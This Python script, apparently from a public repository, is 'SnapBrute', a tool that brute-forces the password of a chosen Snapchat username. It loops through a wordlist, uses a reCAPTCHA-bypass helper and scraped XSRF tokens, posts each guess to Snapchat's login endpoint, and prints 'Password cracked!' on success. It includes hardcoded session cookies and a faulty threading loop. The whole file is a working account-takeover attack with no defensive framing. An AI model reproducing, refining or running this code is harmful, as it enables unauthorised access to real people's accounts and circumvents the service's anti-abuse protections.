import requests, os, re, threading
from colorama import Fore
from lib.captcha import reCAPTCHA

class SnapBrute:
    def ui(self):
        os.system("cls && title SnapBrute ^| github.com/Plasmonix") 
        print(f"""{Fore.BLUE}
    \t\t\t  _________                   __________                __           
    \t\t\t /   _____/ ____ _____  ______\______   \_______ __ ___/  |_  ____   
    \t\t\t \_____  \ /    \\__  \ \____ \|    |  _/\_  __ \  |  \   __\/ __ \  
    \t\t\t /        \   |  \/ __ \|  |_> >    |   \ |  | \/  |  /|  | \  ___/  
    \t\t\t/_______  /___|  (____  /   __/|______  / |__|  |____/ |__|  \___  >
    \t\t\t        \/     \/     \/|__|          \/                         \/  
       {Fore.RESET}""")
    
    def bruter(self):
        self.session = requests.Session()
        for password in open(self.wordlist, "r", encoding="utf8").read().splitlines():
            try:
                self.token = reCAPTCHA.init()
                self.login_token = reCAPTCHA.bypass(self.token)
                xsrf_token = "".join(re.findall('data-xsrf="(.*?)"', str(self.session.get("https://accounts.snapchat.com/accounts/login", headers={"Accept": "*/*","Pragma": "no-cache","User-Agent": 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0)'}).text)))
                headers = {
                    'Host': 'accounts.snapchat.com',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'Accept-Encoding': 'gzip, deflate',
                    'Accept-Language': 'en,en-US;q=0.9,en;q=0.8','Connection': 'close',
                    'Cookie': 'xsrf_token='+xsrf_token+'; web_client_id=5b6ac8a4-e43a-4b04-af42-56d1690da690; _scid=4545dfd0-ff7e-46ea-a282-a8e572282ef3; _sca={%22cid%22:%226d2ee5f8-79ba-486d-b65f-579d272f91ac%22%2C%22token%22:%22v1.key.2021-03-06_cfUM3WwH.iv.LgicCBtnBULigL5T.iyjsJ8WtKqKJJtMdiPBN0NF0LdLgHqeH1VqS5WeTgRhGIEqCzTibnJYPn08FjayPHZzu56GLXE0cCBiHxisJSwpOzdg9GqpoBBvA+IX3E+FwJQWT%22}; sc-cookies-accepted=true; Preferences=true; Performance=true; Marketing=true; _ga=GA1.2.224847189.1623034622; _gid=GA1.2.1966742317.1623034622; sc_at=v2|H4sIAAAAAAAAAE3GsRHAMAgDwIm4E1hWkW1CgCk8vNt89axOEmWj2MZ3y3JI+7pGDvRkHiceVywsKuL8igsQq6SxQAAAAA==; _sctr=1|1623013200000; _gcl_au=1.1.1819942820.1623034641; sc-a-csrf=true; _gali=login_form; _gat_UA-41740027-4=1',
                    'Referer': 'https://accounts.snapchat.com/',
                    'Origin': 'https://accounts.snapchat.com',
                    'Content-Length': '3839',
                    'Cache-Control': 'max-age=0',
                    'Sec-Ch-Ua': '\\" Not A;Brand\\";v=\\"99\\", \\"Chromium\\";v=\\"90\\"',
                    'Sec-Ch-Ua-Mobile': '?0',
                    'Upgrade-Insecure-Requests': '1',
                    'Content-Type': 'application/x-www-form-urlencoded','Sec-Fetch-Site': 'same-origin','Sec-Fetch-Mode': 'navigate','Sec-Fetch-User': '?1','Sec-Fetch-Dest': 'document',
                    "User-Agent": 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0)'
                    }
       
                data = {
                    'username':self.username,
                    'password':password,
                    'xsrf_token':xsrf_token,
                    'continue':'%2Faccounts%2Fwelcome',
                    'g-recaptcha-response':self.login_token,
                    'g-recaptcha-response':self.login_token
                    }

                req = self.session.post("https://accounts.snapchat.com/accounts/login", headers=headers, data=data)
        
                if 'My Data' in req.text:
                    print(f'[{Fore.GREEN}+{Fore.RESET}] Password cracked! -> {password}')
                elif 'Delete My Account' in req.text:
                    print(f'[{Fore.GREEN}+{Fore.RESET}] Password cracked! -> {password}')
                elif 'change_password' in req.text:
                    print(f'[{Fore.GREEN}+{Fore.RESET}] Password cracked! -> {password}')
                elif '"Cannot find the user."' in req.text:
                    print(f'[{Fore.RED}!{Fore.RESET}] Account not found!')
                elif '"That&#39;s not the right password."' in req.text:
                    print(f'[{Fore.RED}!{Fore.RESET}] Incorrect password! -> {password}')
                elif 'phone='in req.text:
                    print(f'[{Fore.BLUE}!{Fore.RESET}] Secure account!')

            except:
                 print(f'[{Fore.RED}!{Fore.RESET}] An error occured!')

    def main(self):
        self.ui()
        self.username = input(f"[{Fore.BLUE}?{Fore.RESET}] Target username> ")
        self.wordlist = input(f"[{Fore.BLUE}?{Fore.RESET}] Wordlist file> ")
        self.ui()
        for _ in range(100): #Threads
            try:
                threading.Thread(target=self.bruter()).start()
            except Exception as err:
                print(err)

if __name__ == "__main__":      
    n = SnapBrute()
    n.main()
